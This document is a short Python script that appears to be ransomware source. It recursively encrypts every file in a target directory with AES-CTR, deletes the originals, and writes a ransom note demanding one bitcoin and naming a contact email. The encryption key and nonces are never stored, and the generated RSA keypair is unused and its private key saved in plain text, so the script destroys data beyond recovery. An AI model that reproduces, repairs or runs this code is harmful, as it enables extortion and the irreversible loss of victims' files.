import os
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def encrypt_file(key, file_path):
    with open(file_path, 'rb') as f:
        data = f.read()
    cipher = Cipher(algorithms.AES(key), modes.CTR(os.urandom(16)), backend=default_backend())
    encryptor = cipher.encryptor()
    ct = encryptor.update(data) + encryptor.finalize()
    with open(file_path + '.enc', 'wb') as f:
        f.write(ct)
    os.remove(file_path)

def encrypt_directory(key, directory_path):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            encrypt_file(key, os.path.join(root, file))

def create_ransom_note():
    with open('ransom_note.txt', 'w') as f:
        f.write('Your files have been encrypted. To decrypt them, send 1 bitcoin to the following address:\n\n')
        f.write('3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy\n\n')
        f.write('Once payment is made, send an email to hacker@example.com with your payment transaction ID. You will receive a decryption key that can be used to recover your files.')

def main():
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    public_key = private_key.public_key()
    with open('private_key.pem', 'wb') as f:
        f.write(private_key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.TraditionalOpenSSL, encryption_algorithm=serialization.NoEncryption()))
    with open('public_key.pem', 'wb') as f:
        f.write(public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo))

    directory_path = '/path/to/your/directory'
    key = os.urandom(32)
    encrypt_directory(key, directory_path)
    create_ransom_note()

if __name__ == '__main__':
    main()
